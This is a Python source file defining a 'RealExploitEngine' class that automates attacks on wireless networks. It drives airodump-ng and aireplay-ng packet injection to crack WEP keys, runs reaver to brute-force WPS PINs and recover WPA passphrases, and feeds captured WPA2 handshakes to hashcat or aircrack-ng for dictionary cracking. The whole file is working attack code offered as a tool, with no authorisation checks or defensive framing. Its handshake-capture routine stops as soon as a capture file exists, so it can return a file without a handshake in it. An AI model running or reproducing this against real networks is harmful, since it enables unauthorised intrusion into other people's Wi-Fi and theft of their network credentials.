import subprocess
import os
import platform as system_platform
import time
import tempfile
import logging
from typing import Dict, List, Optional, Tuple
from pathlib import Path


class RealExploitEngine:
    
    def __init__(self):
        self.callback = lambda *args, **kwargs: None
        self.tools_available = self._check_tools()
        self.temp_dir = tempfile.mkdtemp(prefix="ghost_sniffer_")
        self.logger = logging.getLogger("ghost_sniffer")
        
    def _check_tools(self) -> Dict[str, bool]:
        tools = {
            'aircrack-ng': False,
            'aireplay-ng': False,
            'airodump-ng': False,
            'reaver': False,
            'hashcat': False,
            'hcxdumptool': False,
            'hcxtools': False
        }
        
        for tool in tools.keys():
            try:
                if system_platform.system() == "Windows":
                    result = subprocess.run(['where', tool], 
                                          capture_output=True, timeout=2)
                    tools[tool] = result.returncode == 0
                else:
                    result = subprocess.run(['which', tool], 
                                          capture_output=True, timeout=2)
                    tools[tool] = result.returncode == 0
            except:
                tools[tool] = False
        
        return tools
    
    def get_tools_status(self) -> Dict[str, bool]:
        return self.tools_available.copy()
    
    def attack_wep(self, network: Dict, interface: str, timeout: int = 300) -> Tuple[bool, str, Dict]:
        if not self.tools_available.get('aircrack-ng'):
            return False, "", {"error": "aircrack-ng not available"}
        
        ssid = network.get('ssid', 'Unknown')
        bssid = network.get('bssid', '')
        
        if bssid == 'Unknown' or not bssid:
            return False, "", {"error": "BSSID required for WEP attack"}
        
        try:
            cap_file = os.path.join(self.temp_dir, f"{ssid.replace(' ', '_')}.cap")
            
            self.callback("exploit_progress", {
                "network": network,
                "progress": 20,
                "status": "Capturing IV packets with airodump-ng..."
            })
            
            airodump_cmd = [
                'airodump-ng',
                '--bssid', bssid,
                '--channel', str(network.get('channel', 1)),
                '--write', cap_file.replace('.cap', ''),
                interface
            ]
            
            airodump_proc = subprocess.Popen(
                airodump_cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            
            if self.tools_available.get('aireplay-ng'):
                self.callback("exploit_progress", {
                    "network": network,
                    "progress": 40,
                    "status": "Injecting packets to generate IVs..."
                })
                
                time.sleep(5)
                
                aireplay_cmd = [
                    'aireplay-ng',
                    '--arpreplay',
                    '-b', bssid,
                    '-h', '00:11:22:33:44:55',
                    interface
                ]
                
                aireplay_proc = subprocess.Popen(
                    aireplay_cmd,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE
                )
            
            start_time = time.time()
            iv_count = 0
            
            while (time.time() - start_time) < timeout:
                time.sleep(10)
                
                progress = min(40 + int((time.time() - start_time) / timeout * 40), 80)
                self.callback("exploit_progress", {
                    "network": network,
                    "progress": progress,
                    "status": f"Collecting IVs... ({int(time.time() - start_time)}s elapsed)"
                })
            
            airodump_proc.terminate()
            if self.tools_available.get('aireplay-ng'):
                aireplay_proc.terminate()
            
            self.callback("exploit_progress", {
                "network": network,
                "progress": 85,
                "status": "Attempting to crack WEP key..."
            })
            
            aircrack_cmd = ['aircrack-ng', cap_file]
            result = subprocess.run(
                aircrack_cmd,
                capture_output=True,
                text=True,
                timeout=60
            )
            
            if 'KEY FOUND' in result.stdout:
                lines = result.stdout.split('\n')
                for line in lines:
                    if 'KEY FOUND' in line:
                        parts = line.split()
                        key_index = parts.index('KEY') + 2
                        if key_index < len(parts):
                            key = parts[key_index].strip('[]')
                            return True, key, {
                                "method": "IV Collection + Aircrack-ng",
                                "ivs_collected": "Unknown",
                                "time_taken": int(time.time() - start_time)
                            }
            
            return False, "", {"error": "Failed to crack WEP key", "output": result.stdout}
            
        except subprocess.TimeoutExpired:
            self.logger.warning("WEP attack timed out for %s", bssid)
            return False, "", {"error": "Attack timed out"}
        except Exception as e:
            self.logger.exception("WEP attack error for %s", bssid)
            return False, "", {"error": str(e)}
    
    def attack_wps(self, network: Dict, interface: str, timeout: int = 1800) -> Tuple[bool, str, Dict]:
        if not self.tools_available.get('reaver'):
            return False, "", {"error": "reaver not available"}
        
        ssid = network.get('ssid', 'Unknown')
        bssid = network.get('bssid', '')
        channel = network.get('channel', 0)
        
        if bssid == 'Unknown' or not bssid:
            return False, "", {"error": "BSSID required for WPS attack"}
        
        if channel == 0:
            return False, "", {"error": "Channel required for WPS attack"}
        
        try:
            self.callback("exploit_progress", {
                "network": network,
                "progress": 10,
                "status": "Starting WPS PIN brute-force with reaver..."
            })
            
            reaver_cmd = [
                'reaver',
                '-i', interface,
                '-b', bssid,
                '-c', str(channel),
                '-vv',
                '-L',
                '-N',
                '-d', '15',
                '-T', '5',
                '-l', '300'
            ]
            
            start_time = time.time()
            proc = subprocess.Popen(
                reaver_cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                bufsize=1,
                universal_newlines=True
            )
            
            pin = ""
            for line in proc.stdout:
                if 'WPS PIN:' in line:
                    parts = line.split('WPS PIN:')
                    if len(parts) > 1:
                        pin = parts[1].strip()
                
                if 'WPA PSK:' in line:
                    parts = line.split('WPA PSK:')
                    if len(parts) > 1:
                        psk = parts[1].strip()
                        proc.terminate()
                        return True, psk, {
                            "method": "WPS PIN Brute-Force (Reaver)",
                            "pin": pin,
                            "time_taken": int(time.time() - start_time)
                        }
                
                elapsed = time.time() - start_time
                progress = min(10 + int((elapsed / timeout) * 80), 90)
                self.callback("exploit_progress", {
                    "network": network,
                    "progress": progress,
                    "status": f"Brute-forcing WPS PIN... ({int(elapsed)}s elapsed)"
                })
                
                if elapsed > timeout:
                    proc.terminate()
                    return False, "", {"error": "WPS attack timed out"}
            
            proc.wait()
            return False, "", {"error": "WPS PIN not found"}
            
        except Exception as e:
            self.logger.exception("WPS attack error for %s", bssid)
            return False, "", {"error": str(e)}
    
    def attack_wpa2_dictionary(self, network: Dict, handshake_file: str, 
                               wordlist: str = None, timeout: int = 3600) -> Tuple[bool, str, Dict]:
        if not handshake_file or not os.path.exists(handshake_file):
            return False, "", {"error": "Handshake file required"}
        
        if self.tools_available.get('hashcat') and wordlist:
            return self._hashcat_attack(handshake_file, wordlist, timeout)
        
        if self.tools_available.get('aircrack-ng') and wordlist:
            return self._aircrack_attack(handshake_file, wordlist, timeout)
        
        return False, "", {"error": "hashcat or aircrack-ng with wordlist required"}
    
    def _hashcat_attack(self, handshake_file: str, wordlist: str, timeout: int) -> Tuple[bool, str, Dict]:
        try:
            self.callback("exploit_progress", {
                "network": {},
                "progress": 50,
                "status": "Running hashcat dictionary attack..."
            })
            
            hc22000_file = handshake_file.replace('.cap', '.hc22000')
            
            if self.tools_available.get('hcxtools'):
                convert_cmd = ['hcxpcaptool', '-z', hc22000_file, handshake_file]
                subprocess.run(convert_cmd, capture_output=True, timeout=30)
            
            hashcat_cmd = [
                'hashcat',
                '-m', '22000',
                hc22000_file,
                wordlist,
                '--quiet'
            ]
            
            start_time = time.time()
            result = subprocess.run(
                hashcat_cmd,
                capture_output=True,
                text=True,
                timeout=timeout
            )
            
            if result.returncode == 0:
                lines = result.stdout.split('\n')
                for line in lines:
                    if hc22000_file in line and ':' in line:
                        parts = line.split(':')
                        if len(parts) >= 2:
                            password = parts[-1].strip()
                            return True, password, {
                                "method": "Hashcat Dictionary Attack",
                                "time_taken": int(time.time() - start_time)
                            }
            
            return False, "", {"error": "Password not found in wordlist"}
            
        except subprocess.TimeoutExpired:
            self.logger.warning("Hashcat dictionary attack timed out")
            return False, "", {"error": "Dictionary attack timed out"}
        except Exception as e:
            self.logger.exception("Hashcat dictionary attack error")
            return False, "", {"error": str(e)}
    
    def _aircrack_attack(self, handshake_file: str, wordlist: str, timeout: int) -> Tuple[bool, str, Dict]:
        try:
            self.callback("exploit_progress", {
                "network": {},
                "progress": 50,
                "status": "Running aircrack-ng dictionary attack..."
            })
            
            aircrack_cmd = [
                'aircrack-ng',
                '-w', wordlist,
                handshake_file
            ]
            
            start_time = time.time()
            result = subprocess.run(
                aircrack_cmd,
                capture_output=True,
                text=True,
                timeout=timeout
            )
            
            if 'KEY FOUND' in result.stdout:
                lines = result.stdout.split('\n')
                for line in lines:
                    if 'KEY FOUND' in line:
                        parts = line.split('KEY FOUND')
                        if len(parts) > 1:
                            password = parts[1].strip().strip('[]')
                            return True, password, {
                                "method": "Aircrack-ng Dictionary Attack",
                                "time_taken": int(time.time() - start_time)
                            }
            
            return False, "", {"error": "Password not found in wordlist"}
            
        except subprocess.TimeoutExpired:
            self.logger.warning("Aircrack-ng dictionary attack timed out")
            return False, "", {"error": "Dictionary attack timed out"}
        except Exception as e:
            self.logger.exception("Aircrack-ng dictionary attack error")
            return False, "", {"error": str(e)}
    
    def capture_handshake(self, network: Dict, interface: str, timeout: int = 300) -> Optional[str]:
        if not self.tools_available.get('airodump-ng'):
            return None
        
        ssid = network.get('ssid', 'Unknown')
        bssid = network.get('bssid', '')
        channel = network.get('channel', 0)
        
        if bssid == 'Unknown' or not bssid or channel == 0:
            return None
        
        try:
            cap_file = os.path.join(self.temp_dir, f"{ssid.replace(' ', '_')}_handshake.cap")
            
            airodump_cmd = [
                'airodump-ng',
                '--bssid', bssid,
                '--channel', str(channel),
                '--write', cap_file.replace('.cap', ''),
                interface
            ]
            
            proc = subprocess.Popen(
                airodump_cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            
            start_time = time.time()
            while (time.time() - start_time) < timeout:
                time.sleep(5)
                if os.path.exists(cap_file):
                    proc.terminate()
                    return cap_file
            
            proc.terminate()
            return None
            
        except Exception as e:
            return None
    
    def cleanup(self):
        """Clean up temporary files and directories"""
        import shutil
        try:
            if os.path.exists(self.temp_dir):
                shutil.rmtree(self.temp_dir, ignore_errors=True)
        except:
            pass
    
    def __del__(self):
        """Automatic cleanup on object destruction"""
        self.cleanup()